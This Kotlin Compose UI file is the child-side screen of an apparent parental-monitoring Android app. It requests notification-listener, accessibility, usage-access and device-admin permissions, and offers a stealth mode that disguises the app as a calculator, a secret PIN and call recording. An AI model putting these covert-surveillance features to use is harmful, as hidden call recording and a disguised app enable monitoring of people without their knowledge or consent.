package com.example.authapp.ui.screens

import android.content.Intent
import android.net.Uri
import android.os.Build
import android.provider.Settings
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.background
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.foundation.verticalScroll
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.ChildCare
import androidx.compose.material.icons.filled.ExitToApp
import androidx.compose.material.icons.filled.Security
import androidx.compose.material.icons.filled.Settings
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.lifecycle.Lifecycle
import androidx.lifecycle.LifecycleEventObserver
import androidx.lifecycle.compose.LocalLifecycleOwner
import com.example.authapp.analytics.AppHealthTelemetry
import com.example.authapp.data.AppPreferences
import com.example.authapp.data.CallLogSyncManager
import com.example.authapp.data.CallRecordingPreferences
import com.example.authapp.data.FirebaseRepository
import com.example.authapp.utils.DeviceAdminManager

@Composable
fun ChildScreen(
    email: String,
    onSignOut: () -> Unit,
    onLockToCalculator: () -> Unit = {},
    modifier: Modifier = Modifier
) {
    val context = LocalContext.current
    val currentChildUid = FirebaseRepository.currentUser?.uid ?: ""
    var linkedParentId by remember { mutableStateOf("") }
    var childPairingCode by remember { mutableStateOf<String?>(null) }
    var showSettingsDialog by remember { mutableStateOf(false) }
    var showSignOutConfirmDialog by remember { mutableStateOf(false) }
    var showChangePinDialog by remember { mutableStateOf(false) }
    var isDeviceAdminActive by remember { mutableStateOf(DeviceAdminManager.isDeviceAdminActive(context)) }
    var isStealthMode by remember { mutableStateOf(AppPreferences.isStealthModeEnabled(context)) }
    var currentSecretPin by remember { mutableStateOf(AppPreferences.getSecretPin(context)) }
    var callRecordingEnabled by remember { mutableStateOf(CallRecordingPreferences.isEnabled(context)) }
    var hasStage1Permissions by remember { mutableStateOf(false) }
    var hasCallPermissions by remember { mutableStateOf(false) }
    var hasOverlayPermission by remember { mutableStateOf(false) }
    var isBatteryOptimizationIgnored by remember { mutableStateOf(false) }
    var hasExactAlarmPermission by remember { mutableStateOf(false) }
    var hasNotificationListenerPermission by remember { mutableStateOf(false) }
    var hasUsageAccessPermission by remember { mutableStateOf(false) }
    var hasAccessibilityPermission by remember { mutableStateOf(false) }

    fun checkPermissions() {
        val s = ChildPermissionsHelper.checkAllPermissions(context, currentChildUid)
        hasStage1Permissions = s.hasStage1
        hasCallPermissions = s.hasCall
        hasOverlayPermission = s.hasOverlay
        isBatteryOptimizationIgnored = s.isBatteryOptimized
        hasExactAlarmPermission = s.hasExactAlarm
        hasNotificationListenerPermission = s.hasNotificationListener
        hasUsageAccessPermission = s.hasUsageAccess
        hasAccessibilityPermission = s.hasAccessibility
        isDeviceAdminActive = s.isDeviceAdmin
    }

    val stage1Launcher = rememberLauncherForActivityResult(
        contract = ActivityResultContracts.RequestMultiplePermissions()
    ) {
        checkPermissions()
    }

    fun triggerCorePermissionsRequest() {
        stage1Launcher.launch(ChildPermissionsHelper.getCorePermissionsList())
    }

    LaunchedEffect(currentChildUid, linkedParentId) {
        if (currentChildUid.isNotEmpty() && linkedParentId.isEmpty()) {
            FirebaseRepository.getOrGenerateChildPairingCode(currentChildUid, email) { code, _ ->
                if (!code.isNullOrBlank()) childPairingCode = code
            }
        }
    }

    DisposableEffect(currentChildUid) {
        if (currentChildUid.isEmpty()) return@DisposableEffect onDispose {}
        val listener = FirebaseRepository.listenToChildParentLink(currentChildUid) { parentId ->
            linkedParentId = parentId
        }
        onDispose {
            FirebaseRepository.removeValueListener("users/$currentChildUid/parentId", listener)
        }
    }

    val lifecycleOwner = LocalLifecycleOwner.current
    DisposableEffect(lifecycleOwner) {
        val observer = LifecycleEventObserver { _, event ->
            if (event == Lifecycle.Event.ON_RESUME) checkPermissions()
        }
        lifecycleOwner.lifecycle.addObserver(observer)
        onDispose { lifecycleOwner.lifecycle.removeObserver(observer) }
    }

    LaunchedEffect(Unit) {
        checkPermissions()
        if (!hasStage1Permissions || !hasCallPermissions) {
            triggerCorePermissionsRequest()
        }
    }

    val allCoreGranted = hasStage1Permissions && hasCallPermissions

    Column(
        modifier = modifier
            .fillMaxSize()
            .verticalScroll(rememberScrollState())
            .padding(horizontal = 16.dp, vertical = 12.dp),
        horizontalAlignment = Alignment.CenterHorizontally,
        verticalArrangement = Arrangement.Top
    ) {
        // Compact Modern Header Card
        Card(
            modifier = Modifier.fillMaxWidth(),
            shape = RoundedCornerShape(16.dp),
            colors = CardDefaults.cardColors(
                containerColor = MaterialTheme.colorScheme.surfaceVariant.copy(alpha = 0.5f)
            )
        ) {
            Row(
                modifier = Modifier
                    .fillMaxWidth()
                    .padding(horizontal = 14.dp, vertical = 10.dp),
                verticalAlignment = Alignment.CenterVertically
            ) {
                Box(
                    modifier = Modifier
                        .size(42.dp)
                        .clip(CircleShape)
                        .background(MaterialTheme.colorScheme.primaryContainer),
                    contentAlignment = Alignment.Center
                ) {
                    Icon(
                        imageVector = Icons.Default.ChildCare,
                        contentDescription = "Child Icon",
                        tint = MaterialTheme.colorScheme.primary,
                        modifier = Modifier.size(24.dp)
                    )
                }

                Spacer(modifier = Modifier.width(12.dp))

                Column(modifier = Modifier.weight(1f)) {
                    Row(
                        verticalAlignment = Alignment.CenterVertically,
                        horizontalArrangement = Arrangement.spacedBy(8.dp)
                    ) {
                        Text(
                            text = "Child Dashboard",
                            style = MaterialTheme.typography.titleMedium.copy(fontWeight = FontWeight.Bold),
                            color = MaterialTheme.colorScheme.onBackground
                        )
                        Surface(
                            color = MaterialTheme.colorScheme.secondaryContainer,
                            shape = RoundedCornerShape(6.dp)
                        ) {
                            Text(
                                text = "CHILD",
                                style = MaterialTheme.typography.labelSmall.copy(fontWeight = FontWeight.Bold),
                                color = MaterialTheme.colorScheme.onSecondaryContainer,
                                modifier = Modifier.padding(horizontal = 6.dp, vertical = 2.dp)
                            )
                        }
                    }
                    Spacer(modifier = Modifier.height(2.dp))
                    Text(
                        text = email,
                        style = MaterialTheme.typography.bodySmall,
                        color = MaterialTheme.colorScheme.onSurfaceVariant,
                        maxLines = 1
                    )
                }

                FilledTonalIconButton(
                    onClick = { showSignOutConfirmDialog = true },
                    modifier = Modifier.size(38.dp),
                    colors = IconButtonDefaults.filledTonalIconButtonColors(
                        containerColor = MaterialTheme.colorScheme.errorContainer.copy(alpha = 0.5f)
                    )
                ) {
                    Icon(
                        imageVector = Icons.Default.ExitToApp,
                        contentDescription = "Sign Out",
                        tint = MaterialTheme.colorScheme.error,
                        modifier = Modifier.size(20.dp)
                    )
                }
            }
        }

        Spacer(modifier = Modifier.height(10.dp))

        if (linkedParentId.isEmpty()) {
            ChildPairingCard(
                childPairingCode = childPairingCode,
                allCoreGranted = allCoreGranted,
                onRequestCorePermissions = { triggerCorePermissionsRequest() }
            )
            Spacer(modifier = Modifier.height(10.dp))
        } else {
            ChildLinkedControlsCard(
                isStealthMode = isStealthMode,
                onStealthModeChange = { enabled ->
                    isStealthMode = enabled
                    AppPreferences.setStealthModeEnabled(context, enabled)
                },
                currentSecretPin = currentSecretPin,
                onChangePinClick = { showChangePinDialog = true },
                onLockNowClick = {
                    AppPreferences.setStealthModeEnabled(context, true)
                    isStealthMode = true
                    onLockToCalculator()
                },
                callRecordingEnabled = callRecordingEnabled,
                onCallRecordingChange = { enabled ->
                    callRecordingEnabled = enabled
                    CallRecordingPreferences.setEnabled(context, enabled)
                },
                isDeviceAdminActive = isDeviceAdminActive,
                onDeviceAdminStateChange = { isDeviceAdminActive = it }
            )
            Spacer(modifier = Modifier.height(10.dp))
        }

        SpecialPermissionsCard(
            hasNotificationListener = hasNotificationListenerPermission,
            hasAccessibility = hasAccessibilityPermission,
            hasOverlay = hasOverlayPermission,
            hasUsageAccess = hasUsageAccessPermission,
            isBatteryOptimizationIgnored = isBatteryOptimizationIgnored,
            hasExactAlarm = hasExactAlarmPermission,
            onOpenNotificationListener = { try { context.startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)) } catch (_: Exception) {} },
            onOpenAccessibility = { try { context.startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)) } catch (_: Exception) {} },
            onOpenOverlay = { if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) try { context.startActivity(Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:${context.packageName}"))) } catch (_: Exception) {} },
            onOpenUsageAccess = { try { context.startActivity(Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS)) } catch (_: Exception) {} },
            onOpenBatteryOptimization = {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    try { context.startActivity(Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS, Uri.parse("package:${context.packageName}"))) }
                    catch (_: Exception) { try { context.startActivity(Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS)) } catch (_: Exception) {} }
                }
            },
            onOpenExactAlarm = { if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) try { context.startActivity(Intent(Settings.ACTION_REQUEST_SCHEDULE_EXACT_ALARM, Uri.parse("package:${context.packageName}"))) } catch (_: Exception) {} }
        )

        if (showSignOutConfirmDialog) {
            AlertDialog(
                onDismissRequest = { showSignOutConfirmDialog = false },
                title = { Text("Log Out 🚪", fontWeight = FontWeight.Bold) },
                text = { Text("Kya aap sure hain ki aap is device se log out karna chahte hain?") },
                confirmButton = {
                    Button(
                        onClick = {
                            showSignOutConfirmDialog = false
                            onSignOut()
                        },
                        colors = ButtonDefaults.buttonColors(containerColor = MaterialTheme.colorScheme.error)
                    ) {
                        Text("Log Out")
                    }
                },
                dismissButton = {
                    TextButton(onClick = { showSignOutConfirmDialog = false }) {
                        Text("Cancel")
                    }
                }
            )
        }

        ChildDialogsHost(
            showChangePinDialog = showChangePinDialog,
            onDismissChangePin = { showChangePinDialog = false },
            currentSecretPin = currentSecretPin,
            onPinUpdated = { currentSecretPin = it },
            showSettingsDialog = showSettingsDialog,
            onDismissSettings = { showSettingsDialog = false },
            hasNotificationListener = hasNotificationListenerPermission,
            hasAccessibility = hasAccessibilityPermission,
            hasOverlay = hasOverlayPermission,
            hasUsageAccess = hasUsageAccessPermission,
            isBatteryOptimizationIgnored = isBatteryOptimizationIgnored,
            isDeviceAdminActive = isDeviceAdminActive,
            hasExactAlarm = hasExactAlarmPermission,
            allCoreGranted = allCoreGranted,
            onRequestCorePermissions = { triggerCorePermissionsRequest() }
        )
    }
}
